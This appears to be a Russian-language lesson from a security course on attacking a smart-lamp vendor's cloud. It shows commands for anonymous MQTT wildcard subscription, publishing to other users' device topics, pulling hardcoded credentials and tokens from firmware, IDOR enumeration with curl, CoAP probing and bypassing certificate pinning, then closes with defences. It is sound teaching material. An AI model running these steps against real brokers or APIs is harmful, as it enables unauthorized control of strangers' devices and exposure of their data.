## Вопрос, с которого всё начинается

В прошлом уроке мы захватили лампы через локальный MQTT. Но умные устройства редко ограничиваются локальной сетью: они связаны с облаком вендора, чтобы управляться из приложения откуда угодно. И часто именно облачный канал слабее локального.

Разберём, как устроена связка «устройство — облако — приложение», и где в ней искать дыры.

## Наш пример: облако умных ламп

Возвращаемся к нашим умным лампам. На этот раз нас интересует облачный контур: устройство подключено к брокеру вендора, приложение — к тому же брокеру и к HTTP-API. Схематично:

```
Устройство  <--MQTT/TLS-->  Брокер (облако)  <--MQTT/HTTPS-->  Приложение
      |                                                             |
      +---------------- HTTPS REST API -----------------------------+
```

Наша цель: понять, изолированы ли устройства друг от друга, и можно ли дотянуться до чужой лампы.

## Шаг 1: вспоминаем MQTT-модель

**MQTT** — протокол «издатель-подписчик». Устройства **публикуют** сообщения в **топики** (каналы с иерархическим именем, например `home/room/lamp/state`) и **подписываются** на них. Сообщения принимает **брокер** — сервер, который их раздаёт подписчикам.

Две важные детали: подстановочный символ `#` подписывает сразу на все уровни, а `+` — на один уровень. И ещё: брокер может хранить последнее сообщение топика (**retain**) и отдавать его сразу при подписке.

## Шаг 2: находим брокер и проверяем анонимность

Локальные брокеры ищут сканированием портов:

```
$ nmap -p 1883,8883 --open 192.168.1.0/24
Nmap scan report for 192.168.1.50
1883/tcp open  mqtt
```

Облачный брокер виден в трафике приложения — его снимают через прокси. В любом случае проверяем главное: пускает ли брокер без учётных данных.

```
$ mosquitto_sub -h broker.vendor.com -t '#' -v
lamp/AA:BB:CC/cmd {"state":"on"}
lamp/AA:BB:CC/state {"state":"on","brightness":80}
lamp/DD:EE:FF/state {"state":"off"}
```

Мы подключились без пароля и сразу увидели топики **нескольких** ламп. Последняя строка — уже чужая лампа: значит, изоляции по аккаунту нет.

## Шаг 3: проверяем авторизацию по топикам

Подписка `#` показывает трафик, но это ещё утечка. Проверим, можно ли **управлять** чужим устройством. Из потока видно структуру топика, а `id` в нём предсказуем — это MAC-адрес. Публикуем команду в топик чужой лампы:

```
$ mosquitto_pub -h broker.vendor.com -t 'lamp/DD:EE:FF/cmd' -m '{"state":"on"}'
```

Если лампа соседа загорается — брокер не проверяет права на топик. Это критично: один клиент управляет устройствами всех пользователей.

## Шаг 4: вытаскиваем креды из прошивки

Если брокер требует учётные данные, их часто можно найти в самой прошивке. Распаковываем её и ищем строки:

```
$ strings squashfs-root/usr/bin/* | grep -iE 'mqtt|broker|password'
broker=mqtts://iot.vendor.com:8883
mqtt_user=prod_lamp
mqtt_pass=Lamp12345
```

Пароль в открытом виде. Теперь подключаемся уже с ним:

```
$ mosquitto_sub -h iot.vendor.com -p 8883 -u prod_lamp -P Lamp12345 -t '#' -v
```

Если этот пароль один на весь продукт (а так и бывает при «хардкоде»), то **любой** владелец лампы получает доступ к брокеру и может подписаться на общие топики.

## Шаг 5: идём в облачный REST API

Кроме MQTT, устройство и приложение обращаются к HTTP-API вендора. Адрес и токен тоже лежат в прошивке:

```
$ grep -rE "https?://[a-z0-9.-]+" squashfs-root/ | grep -i api
squashfs-root/etc/config: option cloud_api 'https://api.vendor.com/v1'
$ strings squashfs-root/usr/bin/app | grep -i token
token=eyJhbGciOi...
```

Проверяем API на **IDOR** (доступ к чужому объекту по его идентификатору). Меняем `id` устройства в запросе:

```
$ curl -s -H "Authorization: Bearer eyJhbGciOi..." https://api.vendor.com/v1/devices/1/state
{"state":"on","owner":"other_user"}
$ curl -s -H "Authorization: Bearer eyJhbGciOi..." https://api.vendor.com/v1/devices/2/state
{"state":"off","owner":"yet_another"}
```

Сервер отдаёт состояние чужих устройств — авторизация не проверяет владельца. Идентификаторы последовательны (1, 2, …), поэтому перебор тривиален. Это одна из самых частых и опасных находок в IoT: один пользователь читает и управляет устройствами всех остальных.

## Шаг 6: CoAP как альтернатива

Некоторые устройства вместо MQTT используют **CoAP** — легковесный UDP-протокол, «HTTP для сенсоров». Он тоже часто без аутентификации. Отправной точкой служит ресурс со списком всех остальных:

```
$ coap-client -m get coap://device/.well-known/core
</status>;rt="status"
</config>;rt="config"
$ coap-client -m get coap://device/status
{"on":false}
```

Отсутствие шифрования (DTLS на порту 5684) означает открытый трафик.

## Что мы теперь знаем

По-простому:

1. Умное устройство связано с облаком через MQTT-брокер и HTTP-API.
2. Брокер без аутентификации отдаёт все топики по подписке `#`.
3. Предсказуемые топики и отсутствие ACL позволяют управлять чужими устройствами.
4. Креды и токены часто зашиты в прошивке и одинаковы для всего продукта.
5. Облачный API проверяют на IDOR: подставляют чужой `id`.

## На что смотреть дальше

- **Игнорирование TLS.** На 8883 нужны сертификаты; извлекайте их из прошивки.
- **Опасные команды.** Публикация `unlock` на умном замке — риск; работайте на стенде.
- **Не тот топик.** Ошибка в иерархии — команда не дойдёт; копируйте топик точно из потока.
- **Путаница с retain.** Сохранённое сообщение приходит сразу при подписке — это не live-трафик.
- **Общие креды.** Один пароль на весь продукт означает доступ всех владельцев к общему брокеру.

## Как это выглядит целиком

Маршрут в одну историю: `nmap -p 1883` находит брокер, `mosquitto_sub -t '#'` без пароля отдаёт топики нескольких ламп. Публикуем в `lamp/DD:EE:FF/cmd` — горит чужая лампа. Из прошивки `strings` вытаскивает `mqtt_pass=Lamp12345` (один на весь продукт), а `grep` — `cloud_api` и `token`. `curl` по `/v1/devices/2/state` с этим токеном отдаёт чужое устройство — IDOR. За один проход: анонимный брокер, общий пароль, чужой API.

## Если не сработало

- **Брокер требует пароль.** Пробуйте креды из прошивки и дефолтные (`admin`/`public`).
- **Токен протух.** Обновите подписку `#` и дождитесь свежей публикации.
- **API отвечает 401.** Возможно, нужен другой заголовок (`X-Api-Key`) — смотрите, как это делает приложение.
- **CoAP вместо MQTT.** Проверьте UDP `5683` — устройство может использовать его, и тогда MQTT-путь мимо.
- **Нет изоляции.** Один аккаунт, видящий чужие устройства, — это уже критическая находка для отчёта.

## Шаг 7: смотрим трафик приложения

Облачный контур удобнее всего разбирать со стороны приложения: оно знает адреса API, токены и формат команд. Ставим на телефон HTTP-прокси (mitmproxy/Burp) с доверенным сертификатом и снимаем обмен:

```bash
$ mitmproxy -p 8080
# на телефоне: proxy 192.168.1.10:8080, установить CA-сертификат
```

В потоке видно всё: домены, заголовки с токенами, тело запросов. Если приложение использует **certificate pinning** (жёстко проверяет сертификат сервера), прокси не сработает без обхода — тогда прибегают к Frida и хуку проверки. Но сначала проверьте, нет ли у приложения второй, «отладочной» версии, где pinning отключён.

Отдельно полезно поискать в трафике: версии API (`/v1`, `/v2` — старые часто оставляют без защиты), ключи в query-параметрах (они попадают в логи) и незадокументированные эндпоинты администрирования.

## Шаг 8: не забываем про обновления прошивки

Ещё один канал — OTA-обновление. Если устройство скачивает прошивку по HTTP без проверки подписи, атакующий может подменить образ. Проверяем: есть ли у прошивки подпись, проверяется ли она на устройстве и по какому протоколу идёт загрузка. Отсутствие проверки подписи OTA — критическая уязвимость, дающая компрометацию всего парка.

## Если не сработало

- **Брокер требует пароль, а в прошивке его нет.** Возьмите его из трафика приложения при подключении, а не из строк.
- **`mosquitto_sub` не подключается.** Проверьте порт (1883/8883), TLS (`--cafile`) и формат учётных данных (`-u/-P`).
- **IDOR не срабатывает.** Идентификаторы могут быть UUID — тогда ищите чужие через утечки в других эндпоинтах или в логах.
- **CoAP не отвечает.** Он по UDP: используйте `coap-client` и проверьте порт 5683.
- **Приложение не проксируется.** Включён certificate pinning — обходите через Frida или ищите отладочную сборку.

## Как защититься

- Проверять владельца объекта на сервере для каждого запроса; не доверять `id` из клиента.
- Не использовать один хардкод-пароль на весь продукт; выдавать каждому устройству свои креды.
- Включать аутентификацию и ACL на брокере, запрещать wildcard-подписки клиентам.
- Подписывать OTA-обновления и проверять подпись на устройстве.
- Использовать certificate pinning и не оставлять отладочные API в продакшене.

## Обратная сторона: как защищают IoT-облако

Все находки этого урока — анонимный брокер, общий пароль из прошивки, IDOR в API — это следствия одной ошибки проектирования: **доверие к устройству и каналу без проверки**. Защита строится ровно наоборот.

**Аутентификация на брокере.** MQTT-брокер не должен пускать анонимов: каждый клиент получает свои учётные данные, привязанные к конкретному устройству, а не общий на весь продукт пароль. Идеально — сертификаты mTLS на порту 8883 вместо пароля: тогда одно устройство не может выдать себя за другое.

**ACL и изоляция.** Права подписки и публикации ограничивают по топику: устройство пишет только в свой `device/<id>/...` и не может слушать `#` или чужие устройства. Это прямо закрывает сценарий «подписался на всё и увидел соседей».

**Проверка владельца в API.** Каждый запрос к облаку проверяет, что ресурс принадлежит именно этому пользователю, — а не только валидность токена. Именно этого не хватало в примере с IDOR: токен был подлинный, а владелец не сверялся. Уникальные непоследовательные идентификаторы (UUID) усложняют перебор, но не заменяют авторизацию.

**Подписанные обновления.** OTA-образ должен нести подпись, а устройство — её проверять. Тогда подмена прошивки по HTTP не даёт эффекта.

**Уникальные секреты.** Ключи и токены генерируют на устройство, а не зашивают один на весь продукт: утечка одного образца не должна компрометировать парк. Проверяя продукт, спрашивай по каждому пункту: «что случится, если я знаю прошивку одного устройства?» Хороший ответ — «ничего».

## Куда дальше

Мы разобрали облачный контур умных устройств. Дальше в ветке — промышленные системы: SCADA и протоколы АСУ ТП, где те же принципы приводят к куда более серьёзным последствиям.
